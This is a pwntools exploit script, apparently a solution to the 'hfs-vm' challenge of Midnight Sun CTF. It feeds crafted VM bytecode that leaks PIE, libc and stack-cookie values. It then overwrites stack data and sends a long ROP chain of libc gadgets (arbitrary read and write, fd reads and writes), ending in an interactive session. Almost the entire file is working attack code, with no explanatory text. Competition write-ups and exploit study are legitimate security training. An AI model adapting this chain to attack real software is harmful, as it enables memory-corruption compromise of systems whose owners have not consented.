from pwn import *
import time

def loadreg(reg_num, val):
  return p64(0x2000 | (reg_num << 5) | (val << 16))

def debug():
  return p64(0xa)

def syscall():
  return p64(9)

def pushval(val):
  return p64(5 | 0x2000 | (val << 16))

def pushreg(reg):
  return p64(5 | (reg << 5))

def readstack(regdest, offset):
  return loadreg(5, offset) + p64(8 | (regdest << 5) | (5 << 9))

def putstack(offset, value):
  return loadreg(5, offset) + p64(0x2000 | 7 | (5 << 5) | (value << 16))
 
def putstack2(regnum, offset):
  return loadreg(5, offset) + p64(7 | (5 << 5) | (regnum << 9))

def addreg(regnum, value):
  return p64(1 | 0x2000 | (value << 16) | (regnum << 5))

def subreg(regnum, value):
  return p64(2 | 0x2000 | (value << 16) | (regnum << 5))

r = process("hfs-vm")
#pause()
#r = remote("hfs-vm-01.play.midnightsunctf.se", 4096)
#print r.pid
#sice = open("/proc/{}/maps".format(str(r.pid)), "r").read()
#print sice
#print sice[8]

out = open("exp", "w")

print r.recvuntil("length: ")
code = ""
start = 0xa8
code += readstack(6, (0x38/2))
code += readstack(7, (0x38/2)+1)
code += readstack(8, (0x38/2)+2)
code += readstack(9, (0x38/2)+3)
code += pushreg(6)
code += pushreg(7)
code += pushreg(8)
code += pushreg(9)

code += readstack(6, (0x68/2))
code += readstack(7, (0x68/2)+1)
code += readstack(8, (0x68/2)+2)
code += readstack(9, (0x68/2)+3)
code += addreg(6, 0x3e2)

code += readstack(10, (0xa8/2))
code += readstack(11, (0xa8/2)+1)
code += readstack(12, (0xa8/2)+2)
code += readstack(13, (0xa8/2)+3)
code += subreg(10, 0x830)
code += subreg(11, 0x2)

code += addreg(10, 0x2e8)
code += addreg(11, 0x2)
code += putstack2(10, (0xb0/2))
code += putstack2(11, (0xb0/2)+1)
code += putstack2(12, (0xb0/2)+2)
code += putstack2(13, (0xb0/2)+3)
code += subreg(10, 0x2e8)
code += subreg(11, 0x2)

code += readstack(4, 0xb8/2)
code += subreg(4, 0xe0)
code += putstack2(4, 0xb8/2)

code += addreg(10, 0x937)
code += putstack2(10, (0xa8/2))
code += subreg(10, 0x937)

code += addreg(10, 0x1102)
code += addreg(11, 0x2)
code += putstack2(10, (0xc0/2))
code += putstack2(11, (0xc0/2)+1)
code += putstack2(12, (0xc0/2)+2)
code += putstack2(13, (0xc0/2)+3)
code += subreg(10, 0x1102)
code += subreg(11, 0x2)

code += putstack((0xc8/2), 0)
code += putstack((0xc8/2)+1, 0)
code += putstack((0xc8/2)+2, 0)
code += putstack((0xc8/2)+3, 0)

code += addreg(10, 0x1b92)
code += putstack2(10, (0xd0/2))
code += putstack2(11, (0xd0/2)+1)
code += putstack2(12, (0xd0/2)+2)
code += putstack2(13, (0xd0/2)+3)
code += subreg(10, 0x1b92)

code += putstack((0xd8/2), 0x1000)
code += putstack((0xd8/2)+1, 0)
code += putstack((0xd8/2)+2, 0)
code += putstack((0xd8/2)+3, 0)

code += putstack2(6, (0xe0/2))
code += putstack2(7, (0xe0/2)+1)
code += putstack2(8, (0xe0/2)+2)
code += putstack2(9, (0xe0/2)+3)
code += subreg(6, 0x3e2)

code += p64(0x9)

code += debug()

r.sendline(str(len(code)))
out.write(str(len(code)) + "\n")
print hex(len(code))
print r.recvuntil("code: ")

r.sendline(code)
out.write(code + "\n")
out.close()

r.recvuntil("06: ")
r6 = int(r.recvline(), 16)
r.recvuntil("07: ")
r7 = int(r.recvline(), 16)
r.recvuntil("08: ")
r8 = int(r.recvline(), 16)
r.recvuntil("09: ")
r9 = int(r.recvline(), 16)

pie = r9 << 48 | r8 << 32 | r7 << 16 | r6
pie = pie - 0xe6e
print hex(pie)

r.recvuntil("10: ")
r6 = int(r.recvline(), 16)
r.recvuntil("11: ")
r7 = int(r.recvline(), 16)
r.recvuntil("12: ")
r8 = int(r.recvline(), 16)
r.recvuntil("13: ")
r9 = int(r.recvline(), 16)
libc = r9 << 48 | r8 << 32 | r7 << 16 | r6
print hex(libc)

for i in range(7):
  r.recvuntil("0000 0000 0000 0000")
cookie = int(r.recvline().strip().replace(" ", ""), 16)
print hex(cookie)

poprdi = libc + 0x0000000000021102 # pop rdi ; ret
poprsi = libc + 0x00000000000202e8 # pop rsi ; ret
poprdx = libc + 0x0000000000001b92 # pop rdx ; ret
poprcx = libc + 0x00000000000ea69a # pop rcx ; pop rbx ; ret
subrdi = libc + 0x00000000000aaf8b # sub rdi, 0x10 ; add rax, rdi ; ret
arbread = libc + 0x00000000000c8850 # mov rax, qword ptr [rdi + 0x20] ; ret
arbwrite = libc + 0x000000000003655a # mov qword ptr [rdi], rax ; xor eax, eax ; ret
movrdirax = libc + 0x0000000000086b37 # mov rdi, rax ; pop rbx ; pop rbp ; pop r12 ; jmp rcx
ret = libc + 0x0000000000000937 # ret
poprax = libc + 0x0000000000033544 # pop rax ; ret
writetofd = pie + 0x12d0
#writetofd = libc + 0xf72b0
readfromfd = pie + 0x1250
bss = pie + 0x203130
addrax = libc + 0x000000000008d45a # add rax, rdi ; ret
sleep = libc + 0xcc230


ropchain = "A"*15

ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(0x8)
ropchain += p64(arbwrite)

ropchain += p64(poprdi) + p64(bss)
ropchain += p64(poprax) + p64(0x040404)
ropchain += p64(arbwrite)
ropchain += p64(poprdi) + p64(0x3)
ropchain += p64(poprsi) + p64(bss)
ropchain += p64(poprdx) + p64(0x5)
ropchain += p64(writetofd)

ropchain += p64(poprdi) + p64(0)
ropchain += p64(poprsi) + p64(bss+0x30)
ropchain += p64(poprdx) + p64(0x5)
ropchain += p64(readfromfd)

ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(0x0090)
ropchain += p64(arbwrite)
"""
ropchain += p64(poprdi) + p64(0x3)
ropchain += p64(poprsi) + p64(bss + 0x30)
ropchain += p64(poprdx) + p64(0x2)
ropchain += p64(readfromfd)
"""

ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprdi) + p64(0x7a)
ropchain += p64(addrax)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(poprdi)
ropchain += p64(arbwrite)

ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprdi) + p64(0x7a + 0x8)
ropchain += p64(addrax)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(libc + 0x18cd57)
ropchain += p64(arbwrite)

ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprdi) + p64(0x7a + 0x8 + 0x8)
ropchain += p64(addrax)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(libc + 0x45390)
ropchain += p64(arbwrite)

ropchain += p64(poprdi) + p64(0)
ropchain += p64(poprsi) + p64(bss+0x30)
ropchain += p64(poprdx) + p64(0x5)
ropchain += p64(readfromfd)

ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprdi) + p64(0x7a)
ropchain += p64(addrax)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(poprdi)
ropchain += p64(arbwrite)

ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprdi) + p64(0x7a + 0x8)
ropchain += p64(addrax)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(libc + 0x18cd57)
ropchain += p64(arbwrite)

ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprdi) + p64(0x7a + 0x8 + 0x8)
ropchain += p64(addrax)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(libc + 0x45390)
ropchain += p64(arbwrite)

"""
ropchain += p64(poprdi) + p64(pie + 0x203100 - 0x20)
ropchain += p64(arbread)
ropchain += p64(poprcx) + p64(ret) + p64(0x0)
ropchain += p64(movrdirax) + p64(0x0) + p64(0x0) + p64(0x0)
ropchain += p64(poprax) + p64(0x0068730090)
ropchain += p64(arbwrite)
"""

ropchain += p64(poprdi) + p64(bss + 0x50)
ropchain += p64(poprax) + p64(6)
ropchain += p64(arbwrite)
ropchain += p64(poprdi) + p64(0x3)
ropchain += p64(poprsi) + p64(bss + 0x50)
ropchain += p64(poprdx) + p64(0x5)
ropchain += p64(writetofd)

"""
ropchain += p64(poprdi) + p64(0x3)
ropchain += p64(poprsi) + p64(bss + 0x30)
ropchain += p64(poprdx) + p64(0x2)
ropchain += p64(readfromfd)
"""

print hex(len(ropchain))
ropchain += "A"*(0x1000-len(ropchain))
r.sendline(ropchain)
time.sleep(2)
print "First stage"
r.send("A"*5)
time.sleep(6)
pause()
r.send("B"*5)

r.interactive()
